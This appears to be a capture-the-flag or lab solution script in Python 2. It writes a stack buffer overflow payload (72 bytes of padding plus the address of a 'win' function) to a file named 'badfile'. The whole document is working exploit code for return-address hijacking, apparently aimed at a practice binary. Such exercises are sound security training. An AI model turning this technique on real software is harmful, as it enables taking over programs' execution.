import os
import struct

win = 0x804849b
payload = "A"*72
payload += struct.pack("I",win)

f = open("badfile","a")
f.write(payload)
f.close()
